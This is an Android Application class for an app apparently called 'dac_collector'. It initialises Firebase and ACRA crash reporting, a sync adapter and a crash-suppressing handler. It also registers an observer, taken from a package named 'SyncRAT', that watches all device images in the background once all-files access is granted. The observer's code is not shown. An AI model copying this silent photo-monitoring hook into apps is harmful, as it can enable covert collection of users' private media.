package android.iocl.dac_collector.MainApplication;

import static android.iocl.dac_collector.Utility.Utility.TAG;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.Ui.CrashActivity;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.FirebaseConfigManager;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.tencent.mmkv.MMKV;

import org.acra.ACRA;
import org.acra.config.CoreConfigurationBuilder;
import org.acra.config.HttpSenderConfigurationBuilder;
import org.acra.data.StringFormat;
import org.acra.sender.HttpSender;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Map;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {

    private static MyApp instance;
    private FirebaseCrashlytics crashlytics;
    private final Executor executor = Executors.newSingleThreadExecutor();

    private ImageObserver mImageObserver;
    private volatile String currentActivityName = "Unknown";

    // ✅ KEEP AS-IS
    Boolean installCockroach = true;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        String currentProcess = getProcessNameSafe();
        if (!getPackageName().equals(currentProcess)) {
            return;
        }

        // 🔹 LIGHT INIT ONLY (no heavy I/O)
        MMKV.initialize(this);
        SharedPrefs.init(this);
        FirebaseConfigManager.init();

        initiateDefaultNotificationChannel();
        registerActivityLifecycleCallbacks(this);

        // 🔹 Move heavy work off main thread
        executor.execute(this::initBackground);
    }

    private void initiateDefaultNotificationChannel () {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "default_channel",
                    "Default Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    // ================= BACKGROUND INIT =================
    private void initBackground() {
        try {
            // 🔥 Firebase
            FirebaseApp.initializeApp(this);
            crashlytics = FirebaseCrashlytics.getInstance();

            String cons_id = SharedPrefs.getString(
                    "cons_id",
                    BuildConfig.DEBUG
                            ? "crashedBeforeSettingUp--debug"
                            : "crashedBeforeSettingUp"
            );

            crashlytics.setUserId(cons_id);
            crashlytics.setCrashlyticsCollectionEnabled(installCockroach);

            // 🔥 SharedPrefs migration
            SharedPrefs.migrateFromSharedPrefs(this);

            // 🔥 ACRA
            if (!BuildConfig.DEBUG) {
                initACRA();
            }


            // 🔥 Sync + account (already heavy → keep off UI)
            SyncUtils.initialize(getApplicationContext());

            // 🔥 Delay non-critical hooks to avoid startup ANR
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                installImageObserver();
                installCockroachHandler();
            }, 3000);

        } catch (Exception e) {
            Log.e(TAG, "Init failed", e);
        }
    }

    // ================= ACRA =================
    private void initACRA() {
        try {
            CoreConfigurationBuilder builder = new CoreConfigurationBuilder()
                    .withBuildConfigClass(BuildConfig.class)
                    .withReportFormat(StringFormat.JSON)
                    .withPluginConfigurations(
                            new HttpSenderConfigurationBuilder()
                                    .withUri(Constant.ACRA_REPORT_DB_API)
                                    .withHttpMethod(HttpSender.Method.POST)
                                    .withConnectionTimeout(8000)
                                    .withSocketTimeout(8000)
                                    .withEnabled(true)
                                    .build()
                    );

            ACRA.init(this, builder.build());

        } catch (Exception e) {
            Log.e("ACRA", "Init failed", e);
        }
    }

    // ================= IMAGE OBSERVER =================
    private void installImageObserver() {
        if (mImageObserver != null) return;

        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);

            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
        }
    }

    // ================= COCKROACH =================
    private void installCockroachHandler() {
        if (!installCockroach) return;

        try {
            Cockroach.install(this, new ExceptionHandler() {

                @Override
                protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {

                    Log.e(TAG, "🔥 Uncaught Exception in thread: " + thread.getName(), throwable);

                    crashlytics.recordException(throwable);
                }

                @Override
                protected void onBandageExceptionHappened(Throwable throwable) {

                    Log.e(TAG, "🩹 Bandage Exception (handled by Cockroach)", throwable);

                    crashlytics.recordException(throwable);
                }

                @Override
                protected void onEnterSafeMode() {
                    Log.w(TAG, "⚠️ App entered SAFE MODE due to crash");
                }

                @Override
                protected void onMayBeBlackScreen(Throwable e) {

                    Log.e(TAG, "🖤 Possible BLACK SCREEN detected", e);

                    crashlytics.recordException(e);
                }
            });

        } catch (Exception e) {
            Log.e("Cockroach", "Install failed", e);
        }
    }

    // ================= PROCESS =================
    private String getProcessNameSafe() {
        try {
            int pid = android.os.Process.myPid();
            BufferedReader reader =
                    new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"));
            String processName = reader.readLine().trim();
            reader.close();
            return processName;
        } catch (Exception e) {
            return null;
        }
    }

    // ================= LIFECYCLE =================
    @Override
    public void onActivityResumed(Activity activity) {
        currentActivityName = activity.getClass().getName();
    }

    @Override public void onActivityCreated(Activity a, Bundle b) {}
    @Override public void onActivityStarted(Activity a) {}
    @Override public void onActivityPaused(Activity a) {}
    @Override public void onActivityStopped(Activity a) {}
    @Override public void onActivitySaveInstanceState(Activity a, Bundle b) {}
    @Override public void onActivityDestroyed(Activity a) {}

    public static Context getContext() {
        return instance.getApplicationContext();
    }
}